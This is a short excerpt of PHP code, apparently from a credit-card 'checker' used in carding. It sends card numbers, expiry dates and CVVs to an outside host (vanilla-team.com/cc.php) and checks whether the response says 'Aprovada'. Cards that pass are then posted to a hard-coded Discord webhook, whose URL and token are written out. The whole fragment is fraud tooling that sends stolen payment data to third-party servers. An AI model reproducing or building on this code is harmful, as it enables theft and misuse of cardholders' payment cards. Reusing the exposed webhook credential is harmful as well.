...
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'http://vanilla-team.com/cc.php?lista='.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'');
	...
	if(strpos($r0, 'Aprovada')) {
		...
		if(strpos($r0, 'Aprovada')) {
			...
			if(strpos($r0, 'Aprovada')) {
				...
				$ch = curl_init();
				curl_setopt($ch, CURLOPT_URL, "https://discord.com/api/webhooks/813133594738294805/z0lJdMs_QKDFMRKcf9wTu8CluTJZ_rtNQKqmQp5sfu4mwEB4RqCR9_VtFy7r2ZInCHBK");
				curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
